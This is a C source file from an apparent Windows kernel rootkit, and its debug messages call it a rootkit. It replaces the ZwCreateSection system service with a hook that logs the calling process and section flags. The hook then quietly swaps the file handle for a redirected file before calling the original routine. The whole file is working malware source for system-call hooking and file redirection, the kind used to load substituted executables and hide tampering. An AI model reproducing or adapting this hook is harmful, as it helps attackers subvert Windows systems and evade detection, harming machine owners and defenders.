
#include "rk_driver.h"
#include "rk_memory.h"
#include "rk_defense.h"

/* NT memory manager */

/* __________________________________________________________________________
 . tis R h00k - creating section - usually no object attributes here
 . __________________________________________________________________________ */
#define SEC_FILE           0x800000     
#define SEC_IMAGE         0x1000000     
#define SEC_RESERVE       0x4000000     
#define SEC_COMMIT        0x8000000     
#define SEC_NOCACHE      0x10000000     

NTSTATUS NewZwCreateSection (
	OUT PHANDLE phSection,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG SectionPageProtection,
	IN ULONG AllocationAttributes,
	IN HANDLE hFile OPTIONAL
	)
{
		int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );        
		DbgPrint("rootkit: NewZwCreateSection() from %s\n", aProcessName);

		DumpObjectAttributes(ObjectAttributes);
		
		if(AllocationAttributes & SEC_FILE)
			DbgPrint("AllocationAttributes & SEC_FILE\n");
		if(AllocationAttributes & SEC_IMAGE)
			DbgPrint("AllocationAttributes & SEC_IMAGE\n");
		if(AllocationAttributes & SEC_RESERVE)
			DbgPrint("AllocationAttributes & SEC_RESERVE\n");
		if(AllocationAttributes & SEC_COMMIT)
			DbgPrint("AllocationAttributes & SEC_COMMIT\n");
		if(AllocationAttributes & SEC_NOCACHE)
			DbgPrint("AllocationAttributes & SEC_NOCACHE\n");

		DbgPrint("ZwCreateSection hFile == 0x%X\n", hFile);

#if 1
		if(hFile)
		{
			HANDLE newFileH = CheckForRedirectedFile( hFile );
			if(newFileH){
				hFile = newFileH;
			}
		}
#endif

		rc=((ZWCREATESECTION)(OldZwCreateSection)) (
                        phSection,
                        DesiredAccess,
                        ObjectAttributes,
                        MaximumSize,
                        SectionPageProtection,
                        AllocationAttributes,
                        hFile);
		if(phSection) 
		{
			DbgPrint("section handle 0x%X\n", *phSection);
		}

        DbgPrint("rootkit: ZwCreateSection : rc = %x\n", rc);
        return rc;
}

